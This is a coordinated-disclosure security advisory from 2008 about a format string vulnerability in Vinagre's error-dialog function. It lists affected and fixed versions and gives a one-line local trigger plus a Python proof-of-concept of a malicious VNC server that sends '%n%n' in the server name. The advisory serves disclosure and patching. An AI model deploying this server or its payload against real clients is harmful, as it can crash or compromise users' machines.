Vinagre show_error() format string vulnerability



1. *Advisory Information*

Title: Vinagre show_error() format string vulnerability
Advisory ID: CORE-2008-1127
Advisory URL: http://www.coresecurity.com/content/vinagre-format-string
Date published: 2008-12-09
Date of last update: 2008-12-09
Vendors contacted: Vinagre team
Release mode: Coordinated release


2. *Vulnerability Information*

Class: Format string
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: 32682
CVE Name: N/A


3. *Vulnerability Description*

Vinagre [1] is a VNC client for the GNOME Desktop. A format string error
has been found on the 'vinagre_utils_show_error()' function that can be
exploited via commands issued from a malicious server containing format
string specifiers on the VNC name.

In a web based attack scenario, the user would be required to connect to
a malicious server. Successful exploitation would then allow the
attacker to execute arbitrary code with the privileges of the Vinagre user.


4. *Vulnerable packages*

   . Vinagre 2.24.1 and previous versions


5. *Non-vulnerable packages*

   . Vinagre 2.24.2


6. *Vendor Information, Solutions and Workarounds*

The Vinagre team has released a fixed version, available at
http://ftp.acc.umu.se/pub/GNOME/sources/vinagre/2.24/vinagre-2.24.2.tar.gz


7. *Credits*

This vulnerability was discovered and researched by Alfredo Ortega from
Core Security Technologies.


8. *Technical Description / Proof of Concept Code*

The function 'vinagre_utils_show_error()' on 'src/vinagre-utils.c' follows:

/-----------

57  void
58  vinagre_utils_show_error (const gchar *message, GtkWindow *parent)
59  {
60    GtkWidget *d;
61
62    d = gtk_message_dialog_new (parent,
63              GTK_DIALOG_MODAL | GTK_DIALOG_DESTROY_WITH_PARENT,
64              GTK_MESSAGE_ERROR,
65              GTK_BUTTONS_CLOSE,
66              message);
....

- -----------/

 Here, the "message" string is the format specifier for the function
'gtk_message_dialog_new()', but may be controlled by the user in many
ways. The simplest is the invocation of vinagre via a command line, Ex.:

/-----------

~$vinagre %n%n
- -----------/

 But the vulnerability can also be triggered remotely via a malicious
vnc server.


8.1. *Proof Of Concept*

The following python script implements a basic vnc server that triggers
the vulnerability:

/-----------

##
## Gnome Vinagre format string PoC VNC SERVER
##

import socket
import struct

#create an INET, STREAMing socket
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#bind the socket to a public host,
# and a well-known port
serversocket.bind(("0.0.0.0", 5900))

#become a server socket
serversocket.listen(5)

while 1:
  #accept connections from outside
  (clientsocket, address) = serversocket.accept()
  print "accept"

  # version handshake
  clientsocket.send("RFB 003.008\n")
  resp=clientsocket.recv(100)
  print resp

  # security types (none)
  clientsocket.send("\x01\x01")
  resp=clientsocket.recv(100)
  if resp=="\x01":
    print "security: none"
    clientsocket.send("\x00\x00\x00\x00") #OK
  else: exit(-1)

  # share desktop flag?
  resp=clientsocket.recv(100)

  #framebuffer parameters

clientsocket.send("\x02\xd0\x01\x90\x20\x20\x00\x01\x00\xff\x00\xff\x00\xff\x10\x08\x00\x00\x00\x00\x00\x00\x00\x04%n%n")
#OK

  resp=clientsocket.recv(100)
  clientsocket.close()

- -----------/
